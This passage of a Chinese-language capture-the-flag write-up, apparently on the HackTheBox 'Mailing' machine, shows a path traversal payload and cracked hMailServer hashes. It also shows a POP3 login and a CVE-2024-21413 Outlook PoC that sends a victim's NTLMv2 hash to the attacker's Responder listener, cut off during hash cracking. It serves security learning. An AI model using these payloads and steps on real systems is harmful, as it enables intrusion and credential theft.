 localhost</span></span><br><span class="line"></span><br><span class="line">127.0.0.1	mailing.htb</span><br></pre></td></tr></table></figure></div>
+<p>那竟然確定可以任意下載的話，我們首先感興趣的可能是剛剛提到的 hMailServer 的 config file，那先查一下 hMailServer 是什麼：</p>
+<blockquote>
+<p>hMailServer was a free email server for Windows created by Martin Knafve. It ran as a Windows service and includes administration tools for management and backup. It had support for IMAP, POP3, and SMTP email protocols. It could use external database engines such as MySQL, MS SQL or PostgreSQL, or an internal MS SQL Compact Edition engine to store configuration and index data. The actual email messages were stored on disk in a raw MIME format. As of January 15th, 2022, active support and development were officially halted, although version 5.6 will continue to receive updates for critical bugs. </p>
+</blockquote>
+<p>總結來說是一個支援 IMAP，POP3 還有 SMTP 的免費 windows email server。<br>搜尋一下 hMailServer config file default path：</p>
+<blockquote>
+<p>Where is the hMailServer.ini file located?<br>C:\Program Files\hMailServer\Bin<br>Open hMailServer. ini, typically located under C:\Program Files\hMailServer\Bin. Restart the hMailServer service.</p>
+</blockquote>
+<p>那我們嘗試一下上面的路徑放到我們的 payload：<br><code>http://mailing.htb/download.php?file=../../../../../../Program Files/hMailServer/Bin/hMailServer.ini</code><br>結果檔案找不到：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/mailing_default.png"
+                      alt="default"
+                ><br>又試了一下在 <code>http://mailing.htb/download.php?file=../../../../../../Program%20Files%20(x86)/hMailServer/Bin/hMailServer.ini</code> 找到，看一下 hMailServer.ini 的內容：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ <span class="built_in">cat</span> hMailServer.ini </span><br><span class="line">[Directories]</span><br><span class="line">ProgramFolder=C:\Program Files (x86)\hMailServer</span><br><span class="line">DatabaseFolder=C:\Program Files (x86)\hMailServer\Database</span><br><span class="line">DataFolder=C:\Program Files (x86)\hMailServer\Data</span><br><span class="line">LogFolder=C:\Program Files (x86)\hMailServer\Logs</span><br><span class="line">TempFolder=C:\Program Files (x86)\hMailServer\Temp</span><br><span class="line">EventFolder=C:\Program Files (x86)\hMailServer\Events</span><br><span class="line">[GUILanguages]</span><br><span class="line">ValidLanguages=english,swedish</span><br><span class="line">[Security]</span><br><span class="line">AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7</span><br><span class="line">[Database]</span><br><span class="line">Type=MSSQLCE</span><br><span class="line">Username=</span><br><span class="line">Password=0a9f8ad8bf896b501dde74f08efd7e4c</span><br><span class="line">PasswordEncryption=1</span><br><span class="line">Port=0</span><br><span class="line">Server=</span><br><span class="line">Database=hMailServer</span><br><span class="line">Internal=1</span><br></pre></td></tr></table></figure></div>
+<p>看到一串密文的密碼：<code>0a9f8ad8bf896b501dde74f08efd7e4c</code><br>可以用 <code>hash-identifier</code> 查看密文的類別：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ hash-identifier 0a9f8ad8bf896b501dde74f08efd7e4c</span><br><span class="line">   <span class="comment">#########################################################################</span></span><br><span class="line">   <span class="comment">#     __  __                     __           ______    _____           #</span></span><br><span class="line">   <span class="comment">#    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #</span></span><br><span class="line">   <span class="comment">#    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #</span></span><br><span class="line">   <span class="comment">#     \ \  _  \  /&#x27;__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #</span></span><br><span class="line">   <span class="comment">#      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #</span></span><br><span class="line">   <span class="comment">#       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #</span></span><br><span class="line">   <span class="comment">#        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #</span></span><br><span class="line">   <span class="comment">#                                                             By Zion3R #</span></span><br><span class="line">   <span class="comment">#                                                    www.Blackploit.com #</span></span><br><span class="line">   <span class="comment">#                                                   Root@Blackploit.com #</span></span><br><span class="line">   <span class="comment">#########################################################################</span></span><br><span class="line">--------------------------------------------------</span><br><span class="line"></span><br><span class="line">Possible Hashs:</span><br><span class="line">[+] MD5</span><br><span class="line">[+] Domain Cached Credentials - MD4(MD4((<span class="variable">$pass</span>)).(strtolower(<span class="variable">$username</span>)))</span><br></pre></td></tr></table></figure></div>
+<p>看起來是 md5，用 <code>hashcat</code> 爆看看：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ hashcat <span class="string">&#x27;0a9f8ad8bf896b501dde74f08efd7e4c&#x27;</span> -m 0 -a 0 -o output.txt /usr/share/wordlists/rockyou.txt </span><br><span class="line">hashcat (v6.2.6) starting</span><br><span class="line"></span><br><span class="line">OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform <span class="comment">#1 [The pocl project]</span></span><br><span class="line">==================================================================================================================================================</span><br><span class="line">* Device <span class="comment">#1: pthread-haswell-DO-Regular, skipped</span></span><br><span class="line"></span><br><span class="line">OpenCL API (OpenCL 2.1 LINUX) - Platform <span class="comment">#2 [Intel(R) Corporation]</span></span><br><span class="line">==================================================================</span><br><span class="line">* Device <span class="comment">#2: DO-Regular, 3937/7938 MB (992 MB allocatable), 4MCU</span></span><br><span class="line"></span><br><span class="line">Minimum password length supported by kernel: 0</span><br><span class="line">Maximum password length supported by kernel: 256</span><br><span class="line"></span><br><span class="line">Hashes: 1 digests; 1 unique digests, 1 unique salts</span><br><span class="line">Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates</span><br><span class="line">Rules: 1</span><br><span class="line"></span><br><span class="line">Optimizers applied:</span><br><span class="line">* Zero-Byte</span><br><span class="line">* Early-Skip</span><br><span class="line">* Not-Salted</span><br><span class="line">* Not-Iterated</span><br><span class="line">* Single-Hash</span><br><span class="line">* Single-Salt</span><br><span class="line">* Raw-Hash</span><br><span class="line"></span><br><span class="line">ATTENTION! Pure (unoptimized) backend kernels selected.</span><br><span class="line">Pure kernels can crack longer passwords, but drastically reduce performance.</span><br><span class="line">If you want to switch to optimized kernels, append -O to your commandline.</span><br><span class="line">See the above message to find out about the exact limits.</span><br><span class="line"></span><br><span class="line">Watchdog: Hardware monitoring interface not found on your system.</span><br><span class="line">Watchdog: Temperature abort trigger disabled.</span><br><span class="line"></span><br><span class="line">Host memory required <span class="keyword">for</span> this attack: 1 MB</span><br><span class="line"></span><br><span class="line">Dictionary cache building /usr/share/wordlists/rockyou.txt: 33553434 bytes (23.9Dictionary cache building /usr/share/wordlists/rockyou.txt: 134213744 bytes (95.Dictionary cache built:</span><br><span class="line">* Filename..: /usr/share/wordlists/rockyou.txt</span><br><span class="line">* Passwords.: 14344392</span><br><span class="line">* Bytes.....: 139921507</span><br><span class="line">* Keyspace..: 14344385</span><br><span class="line">* Runtime...: 1 sec</span><br><span class="line"></span><br><span class="line">Approaching final keyspace - workload adjusted.           </span><br><span class="line"></span><br><span class="line">Session..........: hashcat                                </span><br><span class="line">Status...........: Exhausted</span><br><span class="line">Hash.Mode........: 0 (MD5)</span><br><span class="line">Hash.Target......: 0a9f8ad8bf896b501dde74f08efd7e4c</span><br><span class="line">Time.Started.....: Thu Aug 15 20:46:36 2024 (4 secs)</span><br><span class="line">Time.Estimated...: Thu Aug 15 20:46:40 2024 (0 secs)</span><br><span class="line">Kernel.Feature...: Pure Kernel</span><br><span class="line">Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)</span><br><span class="line">Guess.Queue......: 1/1 (100.00%)</span><br><span class="line">Speed.<span class="comment">#2.........:  3672.2 kH/s (0.16ms) @ Accel:512 Loops:1 Thr:1 Vec:8</span></span><br><span class="line">Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)</span><br><span class="line">Progress.........: 14344385/14344385 (100.00%)</span><br><span class="line">Rejected.........: 0/14344385 (0.00%)</span><br><span class="line">Restore.Point....: 14344385/14344385 (100.00%)</span><br><span class="line">Restore.Sub.<span class="comment">#2...: Salt:0 Amplifier:0-1 Iteration:0-1</span></span><br><span class="line">Candidate.Engine.: Device Generator</span><br><span class="line">Candidates.<span class="comment">#2....: $HEX[206b72697374656e616e6e65] -&gt; $HEX[042a0337c2a156616d6f732103]</span></span><br><span class="line"></span><br><span class="line">Started: Thu Aug 15 20:46:25 2024</span><br><span class="line">Stopped: Thu Aug 15 20:46:41 2024</span><br></pre></td></tr></table></figure></div>
+<p>喔不失敗，我們換個線上工具：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/mailing_fail.png"
+                      alt="fail"
+                ><br>又失敗？回去看一下才發現剛剛 hMailServer.ini 有兩組 password：</p>
+<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7</span><br><span class="line">Password=0a9f8ad8bf896b501dde74f08efd7e4c</span><br></pre></td></tr></table></figure></div>
+<p>傻眼，改爆 admin pw</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ hashcat <span class="string">&#x27;841bb5acfa6779ae432fd7a4e6600ba7&#x27;</span> -m 0 /usr/share/wordlists/rockyou.txt </span><br><span class="line">hashcat (v6.2.6) starting</span><br><span class="line"></span><br><span class="line">OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform <span class="comment">#1 [The pocl project]</span></span><br><span class="line">==================================================================================================================================================</span><br><span class="line">* Device <span class="comment">#1: pthread-haswell-DO-Regular, skipped</span></span><br><span class="line"></span><br><span class="line">OpenCL API (OpenCL 2.1 LINUX) - Platform <span class="comment">#2 [Intel(R) Corporation]</span></span><br><span class="line">==================================================================</span><br><span class="line">* Device <span class="comment">#2: DO-Regular, 3937/7938 MB (992 MB allocatable), 4MCU</span></span><br><span class="line"></span><br><span class="line">Minimum password length supported by kernel: 0</span><br><span class="line">Maximum password length supported by kernel: 256</span><br><span class="line"></span><br><span class="line">Hashes: 1 digests; 1 unique digests, 1 unique salts</span><br><span class="line">Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates</span><br><span class="line">Rules: 1</span><br><span class="line"></span><br><span class="line">Optimizers applied:</span><br><span class="line">* Zero-Byte</span><br><span class="line">* Early-Skip</span><br><span class="line">* Not-Salted</span><br><span class="line">* Not-Iterated</span><br><span class="line">* Single-Hash</span><br><span class="line">* Single-Salt</span><br><span class="line">* Raw-Hash</span><br><span class="line"></span><br><span class="line">ATTENTION! Pure (unoptimized) backend kernels selected.</span><br><span class="line">Pure kernels can crack longer passwords, but drastically reduce performance.</span><br><span class="line">If you want to switch to optimized kernels, append -O to your commandline.</span><br><span class="line">See the above message to find out about the exact limits.</span><br><span class="line"></span><br><span class="line">Watchdog: Hardware monitoring interface not found on your system.</span><br><span class="line">Watchdog: Temperature abort trigger disabled.</span><br><span class="line"></span><br><span class="line">Host memory required <span class="keyword">for</span> this attack: 1 MB</span><br><span class="line"></span><br><span class="line">Dictionary cache hit:</span><br><span class="line">* Filename..: /usr/share/wordlists/rockyou.txt</span><br><span class="line">* Passwords.: 14344385</span><br><span class="line">* Bytes.....: 139921507</span><br><span class="line">* Keyspace..: 14344385</span><br><span class="line"></span><br><span class="line">841bb5acfa6779ae432fd7a4e6600ba7:homenetworkingadministrator</span><br><span class="line">                                                          </span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Cracked</span><br><span class="line">Hash.Mode........: 0 (MD5)</span><br><span class="line">Hash.Target......: 841bb5acfa6779ae432fd7a4e6600ba7</span><br><span class="line">Time.Started.....: Thu Aug 15 21:01:42 2024 (3 secs)</span><br><span class="line">Time.Estimated...: Thu Aug 15 21:01:45 2024 (0 secs)</span><br><span class="line">Kernel.Feature...: Pure Kernel</span><br><span class="line">Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)</span><br><span class="line">Guess.Queue......: 1/1 (100.00%)</span><br><span class="line">Speed.<span class="comment">#2.........:  3248.8 kH/s (0.18ms) @ Accel:512 Loops:1 Thr:1 Vec:8</span></span><br><span class="line">Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)</span><br><span class="line">Progress.........: 7563264/14344385 (52.73%)</span><br><span class="line">Rejected.........: 0/7563264 (0.00%)</span><br><span class="line">Restore.Point....: 7561216/14344385 (52.71%)</span><br><span class="line">Restore.Sub.<span class="comment">#2...: Salt:0 Amplifier:0-1 Iteration:0-1</span></span><br><span class="line">Candidate.Engine.: Device Generator</span><br><span class="line">Candidates.<span class="comment">#2....: homie g 1 -&gt; home38119</span></span><br><span class="line"></span><br><span class="line">Started: Thu Aug 15 21:01:40 2024</span><br><span class="line">Stopped: Thu Aug 15 21:01:45 2024</span><br></pre></td></tr></table></figure></div>
+<p>結果 admin 馬上就找到了…<br>841bb5acfa6779ae432fd7a4e6600ba7:homenetworkingadministrator<br>再來我們可以回到前面 <code>nmap</code>，會看到有蠻多服務是開啟的，其中有一個服務是 pop3，搜尋一下這是什麼：</p>
+<blockquote>
+<p>Post Office Protocol (English: Post Office Protocol , abbreviation: POP ) is a member of the TCP&#x2F;IP protocol family and was first defined by RFC 1939 issued in May 1996 . This protocol is primarily used to support remote management of email on the server using a client . The latest version is POP3 , whose full name is “Post Office Protocol - Version 3”, and the POP3 protocol that provides SSL encryption is called POP3S .</p>
+</blockquote>
+<p>簡單來說是一個可以遠端管理信件的協議，用法維基百科上也有寫用法：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/maling_pop3.png"
+                      alt="pop3"
+                ><br>所以我們可以拿剛剛解出來的帳密登入看看：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ telnet 10.129.241.62 110</span><br><span class="line">Trying 10.129.241.62...</span><br><span class="line">Connected to 10.129.241.62.</span><br><span class="line">Escape character is <span class="string">&#x27;^]&#x27;</span>.</span><br><span class="line">+OK POP3</span><br><span class="line">USER administrator@mailing.htb</span><br><span class="line">+OK Send your password</span><br><span class="line">PASS homenetworkingadministrator</span><br><span class="line">+OK Mailbox locked and ready</span><br><span class="line"><span class="built_in">stat</span></span><br><span class="line">+OK 0 0</span><br><span class="line">list</span><br><span class="line">+OK 0 messages (0 octets)</span><br><span class="line">.</span><br></pre></td></tr></table></figure></div>
+<p>竟然是空的 QQ<br>到這邊我們參考一下網路上的解法，發現我們可以去打一個今年 Microsoft Office Outlook 的 CVE，<del>這邊學到凡事都先查有沒有 CVE</del><br><a class="link"   target="_blank" rel="noopener" href="https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability" >https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<blockquote>
+<p>This script presents a proof of concept (PoC) for CVE-2024-21413, a significant security vulnerability discovered in Microsoft Outlook with a CVSS of 9.8. Termed the #MonikerLink bug, this vulnerability has far-reaching implications, including the potential leakage of local NTLM information and the possibility of remote code execution. Moreover, it highlights an attack vector that could bypass Office Protected View, thereby extending its threat to other Office applications.</p>
+</blockquote>
+<p>這個漏洞主要是利用洩漏 NTLM 來達成 RCE，那這邊同時來看一下 NTLM 是什麼東西：</p>
+<blockquote>
+<p>Windows New Technology LAN Manager (NTLM) is a suite of security protocols offered by Microsoft to authenticate users’ identity and protect the integrity and confidentiality of their activity. At its core, NTLM is a single sign on (SSO) tool that relies on a challenge-response protocol to confirm the user without requiring them to submit a password.</p>
+</blockquote>
+<p>Despite known vulnerabilities, NTLM remains widely deployed even on new systems in order to maintain compatibility with legacy clients and servers. While NTLM is still supported by Microsoft, it has been replaced by Kerberos as the default authentication protocol in Windows 2000 and subsequent Active Directory (AD) domains.</p>
+<p>NTLM 簡單來說是一個 SSO 工具，讓使用者可以登入時不用要求他們輸入密碼，但現在漸漸被 Kerberos 取代。<br>好那在開始攻擊前我們需要先開始錄封包，我們可以用一個網路滲透測試工具 <code>Responder</code> 來幫忙</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">└─$ sudo responder -I tun0</span><br><span class="line">                                         __</span><br><span class="line">  .----.-----.-----.-----.-----.-----.--|  |.-----.----.</span><br><span class="line">  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|</span><br><span class="line">  |__| |_____|_____|   __|_____|__|__|_____||_____|__|</span><br><span class="line">                   |__|</span><br><span class="line"></span><br><span class="line">           NBT-NS, LLMNR &amp; MDNS Responder 3.1.4.0</span><br><span class="line"></span><br><span class="line">  To support this project:</span><br><span class="line">  Github -&gt; https://github.com/sponsors/lgandx</span><br><span class="line">  Paypal  -&gt; https://paypal.me/PythonResponder</span><br><span class="line"></span><br><span class="line">  Author: Laurent Gaffie (laurent.gaffie@gmail.com)</span><br><span class="line">  To <span class="built_in">kill</span> this script hit CTRL-C</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Poisoners:</span><br><span class="line">    LLMNR                      [ON]</span><br><span class="line">    NBT-NS                     [ON]</span><br><span class="line">    MDNS                       [ON]</span><br><span class="line">    DNS                        [ON]</span><br><span class="line">    DHCP                       [OFF]</span><br><span class="line"></span><br><span class="line">[+] Servers:</span><br><span class="line">    HTTP server                [ON]</span><br><span class="line">    HTTPS server               [ON]</span><br><span class="line">    WPAD proxy                 [OFF]</span><br><span class="line">    Auth proxy                 [OFF]</span><br><span class="line">    SMB server                 [ON]</span><br><span class="line">    Kerberos server            [ON]</span><br><span class="line">    SQL server                 [ON]</span><br><span class="line">    FTP server                 [ON]</span><br><span class="line">    IMAP server                [ON]</span><br><span class="line">    POP3 server                [ON]</span><br><span class="line">    SMTP server                [ON]</span><br><span class="line">    DNS server                 [ON]</span><br><span class="line">    LDAP server                [ON]</span><br><span class="line">    MQTT server                [ON]</span><br><span class="line">    RDP server                 [ON]</span><br><span class="line">    DCE-RPC server             [ON]</span><br><span class="line">    WinRM server               [ON]</span><br><span class="line">    SNMP server                [OFF]</span><br><span class="line"></span><br><span class="line">[+] HTTP Options:</span><br><span class="line">    Always serving EXE         [OFF]</span><br><span class="line">    Serving EXE                [OFF]</span><br><span class="line">    Serving HTML               [OFF]</span><br><span class="line">    Upstream Proxy             [OFF]</span><br><span class="line"></span><br><span class="line">[+] Poisoning Options:</span><br><span class="line">    Analyze Mode               [OFF]</span><br><span class="line">    Force WPAD auth            [OFF]</span><br><span class="line">    Force Basic Auth           [OFF]</span><br><span class="line">    Force LM downgrade         [OFF]</span><br><span class="line">    Force ESS downgrade        [OFF]</span><br><span class="line"></span><br><span class="line">[+] Generic Options:</span><br><span class="line">    Responder NIC              [tun0]</span><br><span class="line">    Responder IP               [10.10.14.26]</span><br><span class="line">    Responder IPv6             [dead:beef:2::1018]</span><br><span class="line">    Challenge <span class="built_in">set</span>              [random]</span><br><span class="line">    Don<span class="string">&#x27;t Respond To Names     [&#x27;</span>ISATAP<span class="string">&#x27;, &#x27;</span>ISATAP.LOCAL<span class="string">&#x27;]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Current Session Variables:</span></span><br><span class="line"><span class="string">    Responder Machine Name     [WIN-I72N069R99L]</span></span><br><span class="line"><span class="string">    Responder Domain Name      [HO9K.LOCAL]</span></span><br><span class="line"><span class="string">    Responder DCE-RPC Port     [46780]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Listening for events...</span></span><br></pre></td></tr></table></figure></div>
+<p>打開之後就會開始聽，這時候執行我們的 payload：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">└─$ python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.htb --recipient maya@mailing.htb --url <span class="string">&quot;\\10.10.14.26&quot;</span> --subject XD</span><br><span class="line"></span><br><span class="line">CVE-2024-21413 | Microsoft Outlook Remote Code Execution Vulnerability PoC.</span><br><span class="line">Alexander Hagenah / @xaitax / ah@primepage.de</span><br><span class="line"></span><br><span class="line">✅ Email sent successfully.</span><br></pre></td></tr></table></figure></div>
+<p>送出去之後就會拿到下面的資訊：</p>
+<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[SMB] NTLMv2-SSP Client : 10.10.14.26</span><br><span class="line">[SMB] NTLMv2-SSP Username : MAILING\maya</span><br><span class="line">[SMB] NTLMv2-SSP Hash : maya::MAILING:95de498996a31a8c:D2BABC773FF653EE285D33E6FE5493A6:010100000000000080F2298488B6DA015D1DCBB264E2490C0000000002000800530059005500490001001E00570049004E002D005A004F0042005000340036004D0038004B005600410004003400570049004E002D005A004F0042005000340036004D0038004B00560041002E0053005900550049002E004C004F00430041004C000300140053005900550049002E004C004F00430041004C000500140053005900550049002E004C004F00430041004C000700080080F2298488B6DA0106000400020000000800300030000000000000000000000000200000C9E5BC0C7D84E948E12CF5D180E24C511C66B448EF8DB310790EDB6AD72669FF0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00370031000000000000000000</span><br></pre></td></tr></table></figure></div>
+<p>然後我們可以用 <code>hashcat</code> 嘗試幫我們解這個 NTLMv2：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">└─$ hashcat -m 5600 -a 0 -o output.txt ntlm.txt /usr/share/wordlists/rockyou.txt</span><br><span class="line">hashcat (v6.2.6) starting</span><br><span class="line"></span><br><span class="line">OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - 